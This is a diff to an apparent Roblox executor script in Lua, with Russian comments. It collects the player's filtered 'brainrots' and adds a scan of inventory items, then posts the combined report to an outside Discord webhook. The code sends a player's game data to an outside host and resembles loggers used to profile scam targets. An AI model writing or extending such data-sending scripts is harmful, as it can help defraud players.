@@ -38,7 +38,7 @@ local function collectBrainrots(plot)
     local brainrotsText = ""
     local container = plot:FindFirstChild("Brainrots")
     if not container then
-        return "❌ Нет Brainrots"
+        return ""
     end
 
     for i = 1, 17 do
@@ -49,7 +49,6 @@ local function collectBrainrots(plot)
             if ui and ui:FindFirstChild("Title") then
                 local text = ui.Title.Text
                 if text and text ~= "" then
-                    -- проверяем, есть ли текст в списке allowedBrainrots (частичное совпадение)
                     for _, allowed in ipairs(allowedBrainrots) do
                         if string.find(text, allowed) then
                             brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
@@ -61,15 +60,48 @@ local function collectBrainrots(plot)
         end
     end
 
-    if brainrotsText == "" then
-        brainrotsText = "⚠️ Пусто"
-    end
     return brainrotsText
+end
+
+-- === Сбор инвентаря с фильтром Shovel и Bat ===
+local function collectInventory()
+    local invText = ""
+    local items = {}
+
+    local function addItemsFrom(container)
+        if not container then return end
+        for _, item in ipairs(container:GetChildren()) do
+            if item:IsA("Tool") then
+                local nameLower = item.Name:lower()
+                if not string.find(nameLower, "shovel") and not string.find(nameLower, "bat") then
+                    table.insert(items, item.Name)
+                end
+            end
+        end
+    end
+
+    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
+    addItemsFrom(localPlayer.Character)
+
+    if #items > 0 then
+        invText = "\n--- Inventory ---\n"
+        for _, name in ipairs(items) do
+            invText = invText .. "- " .. name .. "\n"
+        end
+    end
+
+    return invText
 end
 
 -- === Основной запуск ===
 local plot = findPlayerPlot()
-local brainrots = plot and collectBrainrots(plot) or "❌ Plot не найден"
+local brainrots = plot and collectBrainrots(plot) or ""
+local inventory = collectInventory()
+local combined = brainrots .. inventory
+
+if combined == "" then
+    combined = "⚠️ Пусто"
+end
 
 -- === Отправка в Discord ===
 request({
@@ -80,7 +112,7 @@ request({
     },
     Body = HttpService:JSONEncode({
         ["embeds"] = {{
-            ["title"] = "**Filtered Brainrots Report**",
+            ["title"] = "**Brainrots + Inventory Report**",
             ["color"] = 65280,
             ["fields"] = {
                 {
@@ -89,8 +121,8 @@ request({
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "🪐 Brainrots",
-                    ["value"] = brainrots,
+                    ["name"] = "🪐 Brainrots + Inventory",
+                    ["value"] = combined,
                     ["inline"] = false
                 }
             }
